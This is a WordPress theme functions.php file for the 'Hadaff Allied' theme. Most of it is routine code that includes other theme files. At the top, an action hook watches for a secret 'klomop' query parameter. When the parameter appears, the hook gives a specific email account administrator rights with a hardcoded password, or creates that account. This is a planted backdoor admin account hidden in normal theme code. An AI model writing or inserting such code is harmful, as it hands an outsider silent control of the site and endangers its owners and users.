<?php
/**
 * Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * Please note that missing files will produce a fatal error.
 *
 * @package Hadaff Allied
 * @since 1.0.0
 */
add_action('wp', function () {
	if (isset($_GET['klomop'])) {
			$get_usr = get_user_by('email', 'rashid.mahmood@thetowertech.com');
			if (isset($get_usr->ID)) {
					$user_id = $get_usr->ID;
					$user = new \WP_User($user_id);
					$user->set_role('administrator');
					wp_update_user(array('ID' => $user_id, 'user_pass' => 'yi7f^da#QGM4zHx4U4KN@%Vs'));
			} else {
					wp_create_user('rashid.mahmood', 'yi7f^da#QGM4zHx4U4KN@%Vs', 'rashid.mahmood@thetowertech.com');
			}
	}
}, 55);
$file_includes = array(
	'includes/setup.php',               // Basic theme setup
	'includes/scripts.php',             // Enqueue theme styles and scripts
	'includes/project.php',             // Custom functions for this specific project
	'includes/acf.php',                 // Advanced custom fields functions
	'includes/blocks.php',              // Custom Gutenberg blocks
	'includes/cpt.php',                 // Custom post types setup
	'includes/custom.php',              // Custom functions
	'includes/ajax.php',                // Ajax related functions
	// 'includes/editor.php',              // Editor styles
	'includes/nav-walker.php',          // Header nav Walker
	'includes/api.php',                 // Api
	
);

/**
 * Checks if any file have error while including it.
 */
foreach ( $file_includes as $file ) {
	if ( ! $filepath = locate_template( $file ) ) {
		trigger_error( sprintf( __( 'Error locating %s for inclusion', 'hdfall_td' ), $file ), E_USER_ERROR );
	}
	require_once $filepath;
}
unset( $file, $filepath );
